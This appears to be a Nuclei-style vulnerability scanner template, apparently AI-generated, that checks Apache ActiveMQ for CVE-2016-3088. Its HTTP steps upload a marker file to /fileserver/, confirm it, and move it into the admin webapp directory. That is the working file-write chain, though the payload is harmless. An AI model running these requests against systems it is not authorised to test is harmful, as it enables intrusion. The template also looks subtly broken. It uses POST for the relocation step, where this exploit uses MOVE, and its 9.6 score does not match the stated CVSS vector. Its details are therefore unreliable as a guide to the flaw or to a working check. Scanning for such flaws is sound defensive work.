id: cve-2016-3088

info:
  name: ActiveMQ Arbitrary File Write Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP POST request.
  reference:
    - http://www.zerodayinitiative.com/advisories/ZDI-16-357
    - http://rhn.redhat.com/errata/RHSA-2016-2036.html
  classification:
    cve-id: CVE-2016-3088
    cvss-score: 9.6
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"

http:
  - id: upload-file
    method: PUT
    headers:
      Content-Type: text/plain
    path:
      - "/fileserver/dsadwe.txt"
    body: wqeasdwqe
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 204

  - id: confirm-upload
    method: GET
    path:
      - "/fileserver/dsadwe.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "wqeasdwqe"

  - id: move-file
    method: POST
    headers:
      Destination: file:///opt/activemq/webapps/admin/s1w23.txt
    path:
      - "/fileserver/dsadwe.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 204
